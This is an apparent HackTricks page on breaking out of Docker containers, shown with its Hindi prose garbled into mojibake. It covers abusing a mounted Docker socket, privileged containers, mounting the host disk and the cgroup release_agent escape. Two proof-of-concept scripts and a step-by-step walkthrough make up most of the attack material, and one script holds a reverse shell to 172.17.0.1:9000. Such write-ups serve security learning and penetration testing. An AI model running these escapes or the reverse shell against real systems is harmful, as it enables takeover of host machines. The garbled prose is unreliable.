<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>


# рдХрдВрдЯреЗрдирд░ рдХреНрдпрд╛ рд╣реИ

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдпрд╣ рдПрдХ **рдЕрд▓рдЧ** **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╣реИ рдЬреЛ **cgroups** (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ CPU рдФрд░ RAM) рдФрд░ **namespaces** (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреНрдпрд╛ рджреЗрдЦ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕реЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬ рдпрд╛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ:
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# рдорд╛рдЙрдВрдЯреЗрдб рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ

рдпрджрд┐ рдЖрдкрдХреЛ рдХрд┐рд╕реА рддрд░рд╣ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдорд╛рдЙрдВрдЯреЗрдб** рд╣реИ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рддреЛ рдЖрдк рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдкрд╛рдПрдВрдЧреЗред\
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрди рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдбреЙрдХрд░ рдбреЗрдореЙрди рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХреНрд░рд┐рдпрд╛рдПрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдбреЙрдХрд░ рдбреЗрдорди рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рдбреЙрдХрд░ рдХрдорд╛рдВрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
рдпрджрд┐ **docker socket рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реНрдерд╛рди рдкрд░ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`docker`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреИрд░рд╛рдореАрдЯрд░ **`-H unix:///path/to/docker.sock`** рдХреЗ рд╕рд╛рдеред
{% endhint %}

# рдХрдВрдЯреЗрдирд░ рдХреНрд╖рдорддрд╛рдПрдБ

рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

рдЖрдк рд╡рд░реНрддрдорд╛рди рдХрдВрдЯреЗрдирд░ рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ рдЖрдк **рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` рдлреНрд▓реИрдЧ

--privileged рдлреНрд▓реИрдЧ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╣реЛрд╕реНрдЯ рдбрд┐рд╡рд╛рдЗрд╕реЗрд╕ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## рдореИрдВ рд░реВрдЯ рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реВрдБ

рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ **fdisk -l** рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдореЗрдВ рдЬрд╣рд╛рдБ --privileged рдлреНрд▓реИрдЧ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИ, рд╣реЛрд╕реНрдЯ рдбреНрд░рд╛рдЗрд╡ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

рддреЛ рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдкрд░ рдХрдмреНрдЬрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕рд░рд▓ рд╣реИ:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
рдФрд░ рд▓реАрдЬрд┐рдпреЗ! рдЕрдм рдЖрдк рд╣реЛрд╕реНрдЯ рдХреА рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `/mnt/hola` рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="рджреВрд╕рд░рд╛ PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` рдЭрдВрдбрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдУрдВ рдХреЛ рдкреЗрд╢ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╢реЛрд╖рдг рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдЭрдВрдбреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕рднреА рдЙрдкрдХрд░рдгреЛрдВ рддрдХ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реЛрддреА рд╣реИ рдФрд░ seccomp, AppArmor, рдФрд░ Linux рдХреНрд╖рдорддрд╛рдУрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдз рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, `--privileged` рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕реЗ рдХрд╣реАрдВ рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ, "рдХреЗрд╡рд▓" рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ:

1. рд╣рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП
2. рдХрдВрдЯреЗрдирд░ рдХреЛ `SYS_ADMIN` Linux рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП
3. рдХрдВрдЯреЗрдирд░ рдореЗрдВ AppArmor рдкреНрд░реЛрдлрд╛рдЗрд▓ рдХреА рдХрдореА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдпрд╛ рдЕрдиреНрдпрдерд╛ `mount` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП
4. рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ cgroup v1 рд╡рд░реНрдЪреБрдЕрд▓ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкрдврд╝рдиреЗ-рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

`SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ рдорд╛рдЙрдВрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рджреЗрдЦреЗрдВ [man 7 capabilities](https://linux.die.net/man/7/capabilities))ред [рдбреЙрдХрд░ рдорд╛рдирдХ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) рдФрд░ `SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбреЙрдХрд░ рдорд╛рдирдХ рд░реВрдк рд╕реЗ `docker-default` AppArmor рдкреЙрд▓рд┐рд╕реА рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ [рдорд╛рдЙрдВрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЬрдм рдХрдВрдЯреЗрдирд░ `SYS_ADMIN` рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ рдХрдВрдЯреЗрдирд░ рдХреЛ `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` рдЭрдВрдбреЗ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдЧрд╛ред

## рдкреНрд░рдорд╛рдг рд╕рдВрдХрд▓реНрдкрдирд╛ рдХреЛ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рдирд╛

рдЕрдм рдЬрдм рд╣рдо рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рд╕рдордЭрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рдорд╛рдг рд╕рдВрдХрд▓реНрдкрдирд╛ рд╢реЛрд╖рдг рдХреЛ рдкрд░рд┐рд╖реНрдХреГрдд рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ, рдЖрдЗрдП рд╣рдо рдЗрд╕реЗ рд▓рд╛рдЗрди-рджрд░-рд▓рд╛рдЗрди рдЪрд▓рдХрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рд╢реЛрд╖рдг рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ cgroup рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо рдПрдХ `release_agent` рдлрд╛рдЗрд▓ рдмрдирд╛ рд╕рдХреЗрдВ рдФрд░ cgroup рдореЗрдВ рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░рдХрд░ `release_agent` рдЖрд╣реНрд╡рд╛рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХреЗрдВред рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ рдФрд░ рдПрдХ рдмрд╛рд▓ cgroup рдмрдирд╛рдирд╛ред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рдПрдХ `/tmp/cgrp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдмрд╛рд▓ cgroup (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП тАЬxтАЭ рдирд╛рдо рд╕реЗ) рдмрдирд╛рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рд░ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рддрдХрдиреАрдХ рдЕрдзрд┐рдХрд╛рдВрд╢ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдпрджрд┐ рдЖрдк рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ рдФрд░ "mount: /tmp/cgrp: special device cgroup does not exist" рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреА рд╕реЗрдЯрдЕрдк рдореЗрдВ RDMA cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдирд╣реАрдВ рд╣реИред рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `rdma` рдХреЛ `memory` рдореЗрдВ рдмрджрд▓реЗрдВред рд╣рдо RDMA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдореВрд▓ PoC рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рд╡реИрд╢реНрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХрдИ рдмрд╛рд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдорд╛рдЙрдВрдЯ рдореЗрдВ рдХрд┐рдП рдЧрдП рдкрд░рд┐рд╡рд░реНрддрди рджреВрд╕рд░реЗ рдорд╛рдЙрдВрдЯ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрдВрдЧреЗред

рдиреАрдЪреЗ рд╣рдо тАЬxтАЭ рдмрд╛рд▓ cgroup рдирд┐рд░реНрдорд╛рдг рдФрд░ рдЗрд╕рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
рдЖрдЧреЗ, рд╣рдо "x" cgroup рдХреЗ рд░рд┐рд▓реАрдЬрд╝ рдкрд░ cgroup рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ рдЙрд╕рдХреА `notify_on_release` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ 1 рд▓рд┐рдЦрдХрд░ред рд╣рдо RDMA cgroup рд░рд┐рд▓реАрдЬрд╝ рдПрдЬреЗрдВрдЯ рдХреЛ рднреА рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░реЗ тАФ рдЬрд┐рд╕реЗ рд╣рдо рдмрд╛рдж рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдмрдирд╛рдПрдВрдЧреЗ тАФ рд╣реЛрд╕реНрдЯ рдкрд░ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрде рдХреЛ `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкрде рд╣реЛрд╕реНрдЯ рдкрд░ `/etc/mtab` рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред

рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣рдо рдЬреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рджреЛрдиреЛрдВ рджреБрдирд┐рдпрд╛ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ: рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЙрдирдХрд╛ рдкрде рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдЙрдирдХрд╛ рдкрдеред

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреЛ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
рдзреНрдпрд╛рди рджреЗрдВ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкрде рдкрд░, рдЬрд┐рд╕реЗ рд╣рдо рд╣реЛрд╕реНрдЯ рдкрд░ рдмрдирд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
рдЕрдм, рд╣рдо `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ `ps aux` рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗ рдФрд░ рдЙрд╕рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╣реЛрд╕реНрдЯ рдкрд░ рдЖрдЙрдЯрдкреБрдЯ рдлрд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реБрдП рдХрдВрдЯреЗрдирд░ рдкрд░ `/output` рдореЗрдВ рд╕реЗрд╡ рдХрд░реЗред рдЕрдВрдд рдореЗрдВ, рд╣рдо `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рднреА рдкреНрд░рд┐рдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рджреЗрдЦ рд╕рдХреЗрдВ:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
